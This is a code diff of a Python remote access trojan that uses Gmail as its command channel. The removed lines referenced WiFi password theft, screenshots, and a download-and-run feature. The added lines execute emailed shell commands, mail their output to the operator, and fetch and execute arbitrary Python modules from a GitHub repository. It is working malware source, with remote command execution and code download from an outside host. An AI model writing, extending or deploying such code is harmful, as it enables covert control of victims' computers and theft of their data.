@@ -1,30 +1,21 @@
-#VERSION 2.00
-from email.mime.text import MIMEText
-from email.header import decode_header
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-
-import imaplib
-import email
+import importlib
 import os
-import smtplib
 import subprocess
 import time
+import imaplib
+import smtplib
+import email
+import threading
+import requests
+import tempfile
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.header import decode_header
 
-#Mods
-from mods.screenshot import screenshot
-from mods.urlDownload import urlDownload
-from mods.systeminfo import systeminfo
-from mods.urlUploader import UrlUploader
-from mods.helper import Helper
-from mods.wifi import WifiPasswordRetriever
-
-#Externals
-from externals.templates import create_html_content,shell
+# Externals
+from externals.templates import create_html_content, shell,systeminfo_template
 from externals.useless import basic_systeminfo
-
-#GettingCreds
-from config.config import config
 
 class EmailHandler:
     def __init__(self, username, password, your_mail):
@@ -34,7 +25,6 @@ class EmailHandler:
         self.imap_server = "imap.gmail.com"
         self.smtp_server = "smtp.gmail.com"
         self.smtp_port = 587
-        
 
     def clean_text(self, text):
         return "".join(c if c.isalnum() else "_" for c in text)
@@ -50,7 +40,6 @@ class EmailHandler:
     def fetch_emails(self, folder="INBOX", num_emails=1):
         self.imap.select(folder)
         status, messages = self.imap.search(None, f"(FROM '{self.your_mail}')")
-        print(status)
         email_ids = messages[0].split()[-num_emails:]
         emails = []
         for email_id in email_ids:
@@ -63,33 +52,23 @@ class EmailHandler:
     def logout_imap(self):
         self.imap.logout()
 
-    def send_email(self, message,msgId="Somethingdifferent",reply=False):
+    def send_email(self, message, msgId="Somethingdifferent", reply=False):
         msg = MIMEMultipart()
         msg['From'] = self.username
         msg['To'] = self.your_mail
         if reply:
             msg['In-Reply-To'] = msgId
             msg['References'] = msgId
-            try:
-                with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
-                    server.starttls()
-                    server.login(self.username, self.password)
-                    msg.attach(MIMEText(message, 'html'))
-                    server.send_message(msg)
-            except Exception as e:
-                print(f"Failed to send email: {e}")
-        else:
-            try:
-                with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
-                    server.starttls()
-                    server.login(self.username, self.password)
-                    msg.attach(MIMEText(message, 'html'))
-                    server.send_message(msg)
-                
-            except Exception as e:
-                print(f"Failed to send email: {e}")
-    
-    def send_file(self,file,filename,msgId=False,message="File Below"):
+        msg.attach(MIMEText(message, 'html'))
+        try:
+            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
+                server.starttls()
+                server.login(self.username, self.password)
+                server.send_message(msg)
+        except Exception as e:
+            print(f"Failed to send email: {e}")
+
+    def send_file(self, file, filename, msgId=False, message="File Below"):
         msg = MIMEMultipart()
         msg['From'] = self.username
         msg['To'] = self.your_mail
@@ -100,11 +79,7 @@ class EmailHandler:
         part = MIMEBase('application', 'octet-stream')
         part.set_payload(file)
         email.encoders.encode_base64(part)
-        part.add_header(
-        'Content-Disposition',
-        f'attachment; filename={filename}',
-    )
-        
+        part.add_header('Content-Disposition', f'attachment; filename={filename}')
         try:
             with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                 server.starttls()
@@ -114,183 +89,106 @@ class EmailHandler:
         except Exception as e:
             print(f"Failed to send email: {e}")
 
-
-
 class CommandHandler:
     def __init__(self, email_handler):
         self.email_handler = email_handler
         self.msgId = ""
+        self.github_repo_url = "https://github.com/siddhant385/pyhackthon"  # Replace with your GitHub repo URL
+        self.temp_dir = tempfile.gettempdir()  # Use the system's temporary directory
 
     def execute_command(self, command):
         try:
             output = subprocess.getoutput(command)
             msg = shell(output)
-            self.email_handler.send_email(message=msg,msgId=self.msgId,reply=True)
+            self.email_handler.send_email(message=msg, msgId=self.msgId, reply=True)
         except Exception as e:
             print(f"Command execution failed: {e}")
 
     def process_email_commands(self, emails):
         for msg in emails:
-            From,encoding = decode_header(msg.get("From"))[0]
-            msgId,encoding = decode_header(msg.get("Message-Id"))[0]
+            from_email, encoding = decode_header(msg.get("From"))[0]
+            msgId, encoding = decode_header(msg.get("Message-Id"))[0]
             if self.msgId == msgId:
                 return None
-            else:
-                self.msgId = msgId
-            if isinstance(From, bytes):
-                From = From.decode(encoding or "utf-8")
-                # msgId = msgId.decode(encoding or "utf-8")
-            # print(f"From: {From}")
-            # print(msgId)
-            print("!New Message Recieved")
-
-            body = ""
-            if msg.is_multipart():
-                for part in msg.walk():
-                    content_type = part.get_content_type()
-                    if content_type == "text/plain":
-                        body = part.get_payload(decode=True).decode()
-                        print(body)
-                        new_body = ''.join(body.splitlines())
-                        break
-            else:
-                content_type = msg.get_content_type()
-                if content_type == "text/plain":
-                    body = msg.get_payload(decode=True).decode()
-                    new_body = ''.join(body.splitlines())
-
-            print(f"Body: {[new_body]}")
-            self.handle_command(new_body)
+            self.msgId = msgId
+            if isinstance(from_email, bytes):
+                from_email = from_email.decode(encoding or "utf-8")
+            print("!New Message Received")
+            body = self.get_email_body(msg)
+            print(f"Body: {[body]}")
+            self.handle_command(body)
             return True
 
+    def get_email_body(self, msg):
+        if msg.is_multipart():
+            for part in msg.walk():
+                if part.get_content_type() == "text/plain":
+                    return part.get_payload(decode=True).decode().replace('\n', ' ')
+        return msg.get_payload(decode=True).decode().replace('\n', ' ')
+
+    def module_exists(self, mod_name):
+        mod_path = os.path.join(self.temp_dir, f"{mod_name}.py")
+        return os.path.exists(mod_path)
+
+    def download_module(self, mod_name):
+        mod_url = f"{self.github_repo_url}/raw/unstable/mods/{mod_name}.py"
+        response = requests.get(mod_url)
+        if response.status_code == 200:
+            mod_path = os.path.join(self.temp_dir, f"{mod_name}.py")
+            with open(mod_path, 'wb') as mod_file:
+                mod_file.write(response.content)
+            print(f"Module '{mod_name}' downloaded successfully.")
+        else:
+            raise ModuleNotFoundError(f"Module '{mod_name}' not found on GitHub.")
 
     def handle_command(self, command):
-        #command for System Info
-        if ":systeminfo" in command:
-            data = systeminfo()
-            data.run(
-                msgId=self.msgId,
-                EmailHandler=self.email_handler
-            )
-            return None
-        
-        elif ":wifi" in command:
-            data = WifiPasswordRetriever()
-            data.run(
-                msgId=self.msgId,
-                EmailHandler=self.email_handler
-            )
-            return None
-        
-        elif command.startswith(":help"):
-            help = Helper()
-            help.run(
-                EmailHandler=self.email_handler,
-                msgId=self.msgId
-            )
-            return None
-        
-        #Screenshot Executing command
-        elif command.startswith(":screenshot"):
-            data = screenshot()
-            data.run(
-                emailHandler=self.email_handler,
-                msgId=self.msgId
-            )
-            return None
-        #Command For Executing urldownloads
-        elif command.startswith(":urldown"):
-
-            args = command.replace('\n', ' ').split(',')
+        if command.startswith(":"):
+            cmd_parts = command.split()
+            mod_name = cmd_parts[0][1:]  # Remove the leading ':'
+            args = cmd_parts[1:]
+            print(args)
             try:
-                url = args[1]
-                filename = args[2]
-                toRun = args[3].lower()
-                if toRun.startswith("false"):
-                    toRun = False
-                else:
-                    toRun = True
-            except IndexError:
-                self.email_handler.send_email("Please send mail in correct Format or type help if you want to know")
-                return None
-            except Exception as e:
-                self.email_handler.send_email(f"Unable to Do operation Error: {e} ")
-                return None
-            if not url.startswith("http"):
-                self.email_handler.send_email("Please send mail in correct Format and with a valid Url Regards")
-                return None
-            down = urlDownload()
-            down.run(
-                url=url,
-                filename=filename,
-                EmailHandler=self.email_handler,
-                msgId=self.msgId,
-                run=toRun
-            )
-            return None
-        
-        #Command to upload file into the mail
-        elif command.startswith(":upload"):
-
-            args = command.replace('\n', ' ').split(',')
-            try:
-                filepath = args[1]
+                # Check if the module exists; if not, download it
+                if not self.module_exists(mod_name):
+                    self.download_module(mod_name)
                 
-            except IndexError:
-                self.email_handler.send_email("Please send args in correct format")
-                return None
-            except Exception as e:
-                self.email_handler.send_email(f"Unable to Do operation Error: {e} ")
-                return None
-            down = UrlUploader()
-            down.run(
-                filepath=filepath,
-                EmailHandler=self.email_handler,
-                msgId=self.msgId,
-            )
-            return None
-        
-        #command to exit the program
-        elif 'exit' in command:
-            print('Exited successfully')
-            self.email_handler.send_email('Exiting, please wait')
-            exit()
+                # Dynamically import the module
+                mod_path = os.path.join(self.temp_dir, f"{mod_name}.py")
+                spec = importlib.util.spec_from_file_location(mod_name, mod_path)
+                mod = importlib.util.module_from_spec(spec)
+                spec.loader.exec_module(mod)
 
-        #Command to sleep the program
-        elif 'sleep' in command:
-            sleep_time = int(command.replace('sleep', '').strip())
-            print(f'Sleeping for {sleep_time} seconds')
-            time.sleep(sleep_time)
-        
-        #Command every other command goes here as shell command
-        if len(command) > 3 and command[0:3] == "cd ":
-            try:
-                os.chdir(os.path.expanduser(command[3:]))
-                msg = shell("Directory changed to: " + os.getcwd())
-                self.email_handler.send_email(message=msg,msgId=self.msgId,reply=True)
-            except Exception as ex:
-                self.email_handler.send_email(f"Error: {e}")
+                # Run the module in a separate thread
+                mod_class = getattr(mod, mod_name)
+                if args == []:
+                    thread = threading.Thread(target=mod_class().run, args=(self.msgId,self.email_handler))
+                else:
+                    thread = threading.Thread(target=mod_class().run, args=(args, self.email_handler, self.msgId))
+                thread.start()
+            except ModuleNotFoundError as e:
+                self.email_handler.send_email(f"{e}")
+            except Exception as e:
+                self.email_handler.send_email(f"Error executing '{mod_name}': {e}")
         else:
             self.execute_command(command)
 
-
 class RATClient:
-    def __init__(self, username, password, your_mail,idle_interval):
+    def __init__(self, username, password, your_mail, idle_interval):
         self.email_handler = EmailHandler(username, password, your_mail)
         self.command_handler = CommandHandler(self.email_handler)
         self.idle_interval = idle_interval
-        self.command_interval = 1 #time in seconds to recheck commands
+        self.command_interval = 1
 
     def start(self):
-        welcom_msg = create_html_content(basic_systeminfo())
-        self.email_handler.send_email(welcom_msg)
-        last_active = time.time()  # The last time a command was requested from the server.
+        welcome_msg = create_html_content(basic_systeminfo())
+        self.email_handler.send_email(welcome_msg)
+        last_active = time.time()
         idle = False
 
         while True:
             self.email_handler.login_imap()
             emails = self.email_handler.fetch_emails()
-            if self.command_handler.process_email_commands(emails) != None:
+            if self.command_handler.process_email_commands(emails) is not None:
                 if idle:
                     print("Switching from idle back to normal mode...")
                 last_active = time.time()
@@ -300,25 +198,17 @@ class RATClient:
             if idle:
                 time.sleep(self.idle_interval)
             elif (time.time() - last_active) >= self.idle_interval:
-                    print(f"The last command was a while ago, switching to idle... : {time.time() - last_active}")
-                    idle = True
+                print(f"Switching to idle... : {time.time() - last_active}")
+                idle = True
             else:
                 time.sleep(self.command_interval)
             self.email_handler.logout_imap()
-            # print(idle)
-
 
 if __name__ == "__main__":
-    #Credential Class
-    creds = config()
+    USERNAME = "###USERNAME"
+    PASSWORD = "###PASSWORD"
+    YOUR_MAIL = "###YOURMAIL"
+    IDLE_INTERVAL = 60
 
-
-
-    USERNAME = creds.EMAIL
-    PASSWORD = creds.PASSWORD
-    YOUR_MAIL = creds.YOUREMAIL
-    IDLE_INTERVAL = 60 #time after which computer will sleep while it was idle
-    # print(USERNAME,PASSWORD,YOUR_MAIL)
-
-    client = RATClient(USERNAME, PASSWORD, YOUR_MAIL,IDLE_INTERVAL)
+    client = RATClient(USERNAME, PASSWORD, YOUR_MAIL, IDLE_INTERVAL)
     client.start()
